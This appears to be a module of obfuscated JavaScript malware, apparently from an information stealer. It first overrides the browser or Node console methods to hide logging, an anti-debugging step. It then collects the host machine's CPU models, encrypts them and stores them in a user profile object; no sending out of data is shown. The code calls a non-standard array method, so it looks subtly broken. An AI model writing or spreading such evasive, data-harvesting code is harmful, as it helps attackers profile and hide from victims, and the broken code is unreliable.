var _0x3dab53 = (function () {
    var _0x3f0b7a = true
    return function (_0x33138b, _0xd9ff4c) {
      var _0x50d859 = _0x3f0b7a
        ? function () {
            if (_0xd9ff4c) {
              var _0x17a69a = _0xd9ff4c.apply(_0x33138b, arguments)
              return (_0xd9ff4c = null), _0x17a69a
            }
          }
        : function () {}
      return (_0x3f0b7a = false), _0x50d859
    }
  })(),
  _0x41d37a = _0x3dab53(this, function () {
    var _0x1fc30c = function () {
      var _0xb9b62f
      try {
        _0xb9b62f = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x13656a) {
        _0xb9b62f = window
      }
      return _0xb9b62f
    }
    var _0x1207ae = _0x1fc30c(),
      _0x1474e4 = (_0x1207ae.console = _0x1207ae.console || {})
    var _0x3abcbc = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (var _0x3a7e4d = 0; _0x3a7e4d < _0x3abcbc.length; _0x3a7e4d++) {
      var _0x48d408 = _0x3dab53.constructor.prototype.bind(_0x3dab53),
        _0x3bb86c = _0x3abcbc[_0x3a7e4d],
        _0xd70b6b = _0x1474e4[_0x3bb86c] || _0x48d408
      _0x48d408['__proto__'] = _0x3dab53.bind(_0x3dab53)
      _0x48d408.toString = _0xd70b6b.toString.bind(_0xd70b6b)
      _0x1474e4[_0x3bb86c] = _0x48d408
    }
  })
_0x41d37a()
module.exports = (_0x35e6a7) => {
  return {
    loadCPUS() {
      var _0x526c4b = []
      _0x35e6a7.requires.os.cpus().forEach((_0x3d9f20) => {
        !_0x526c4b.contains(_0x3d9f20.model) &&
          (_0x526c4b.push(_0x3d9f20.model),
          _0x35e6a7.config.user.cpus.push(
            _0x35e6a7.utils.encryption.encryptData(
              _0x3d9f20.model.split('  ')[0]
            )
          ))
      })
    },
  }
}
